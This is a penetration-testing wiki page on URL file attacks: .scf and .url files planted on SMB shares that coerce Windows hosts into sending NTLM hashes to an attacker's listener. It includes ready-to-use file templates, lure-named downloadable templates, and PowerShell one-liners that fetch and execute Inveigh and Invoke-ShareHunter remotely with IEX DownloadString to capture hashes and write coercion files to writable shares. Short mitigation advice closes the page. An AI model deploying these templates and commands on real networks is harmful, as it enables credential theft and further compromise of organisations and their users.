# URL File Attack

## Description

A URL file attack is a type of network-based exploit that manipulates certain file formats to deceive systems into revealing sensitive information, such as NTLM hashes. This attack exploits the behaviour of URL files (.url), shell command files (.scf), and other file types to initiate connections to an adversary-controlled listener.

An adversary generates files with specific content that directs systems to a network resource managed by the attacker. These files can be of different types, such as .url, .scf, or .lnk:

* **.url File:** A shortcut file that contains a URL pointing to a remote server.
* **.scf File:** A Shell Command File configured to initiate a connection to a remote server.
* **.lnk File:** A Windows shortcut file crafted to point to a remote server.

The attacker distributes these malicious files to potential victims through email attachments, file-sharing services, or other means. When a victim interacts with the file (e.g., opening the file or even just viewing it within explorer), the file triggers the system to connect to the remote server specified in the file.

During the connection attempt, the victim’s system tries to authenticate with the remote server using NTLM (Windows authentication protocol). The attacker’s server captures the NTLM hash, which can then be used for further attacks, such as pass-the-hash attacks.

This document covers delivery through means of SMB shares.

## File Templates

{% tabs %}
{% tab title="@file.scf" %}
```
[Shell]
Command=2
IconFile=\\[Listener-IP]\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```
{% endtab %}

{% tab title="@file.url" %}
```
[InternetShortcut]
URL=\\[Listener-IP]\share
```
{% endtab %}
{% endtabs %}

### Downloadable templates (Edit with Notepad)

* [Template 1 ](https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/NTLM/Coerce/%40Template\_All\_Staff\_Salary\_Grades.scf)
* [Template 2 ](https://github.com/The-Viper-One/RedTeam-Pentest-Tools/blob/main/NTLM/Coerce/%40Template\_Invoice\_June2024.url)



## Performing the attack from Windows

### Tools Required

* Inveigh: [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
* Invoke-ShareHunter (Optional): [https://github.com/Leo4j/Invoke-ShareHunter](https://github.com/Leo4j/Invoke-ShareHunter)

### Permissions Required

* Local Administrator (If using Inveigh to capture hashes)
* Write permissions over a SMB share



Load Inveigh and configure listener

{% code overflow="wrap" %}
```powershell
IEX (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1")

# Load Inveigh and set listener IP (Attack System)
Invoke-Inveigh -ConsoleOutput Y -HTTPS Y -IP 10.10.10.7
```
{% endcode %}

Load Invoke-ShareHunter

{% code overflow="wrap" %}
```powershell
IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-ShareHunter/main/Invoke-ShareHunter.ps1')

# Identify writeable shares within the domain
Invoke-ShareHunter -Domain security.local

# Write NTLM coercion files to identified writeable shares
Invoke-URLFileAttack -WritableShares "C:\Users\StandardUser\Shares_Writable.txt"
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2159).png" alt=""><figcaption><p>Writing files to writeable shares</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2160).png" alt=""><figcaption><p>Later, a user browses to a share containing the crafted files and a NTLM hash is captured on the listener</p></figcaption></figure>

From this point, various opportunity exists to perform further compromise. The captured Hash may be cracked to reveal the underlying account password or the hash may be relayed using tools such as ntlmrelayx.&#x20;

## Mitigation

**Disable NTLM Authentication**

Disabling NTLM authentication within the domain is the most effective defence against this type of attack and other NTLM coercion-based attacks. However, it is understandable that disabling NTLM authentication within an enterprise may not be easily or quickly achievable for many organizations. In such cases, additional mitigations can be implemented. While these additional measures may not completely eliminate the attack vector, they can offer a degree of protection against this type of attack.

Reference: [https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-1-disabling-ntlmv1/ba-p/3934787)



**Audit and restrict SMB share permissions**

URL file attacks are possible when an adversary controlled account has write access to SMB shares within the domain. The best defence here is to audit all SMB shares and remove unexpected or overly permissive write permissions from accounts that do not require that level of access. Broadly, domain user accounts often have write access to an undesirable number of shares within the enterprise and should be revoked.

## References

* [https://www.scip.ch/en/?labs.20210909](https://www.scip.ch/en/?labs.20210909)
* [https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication)
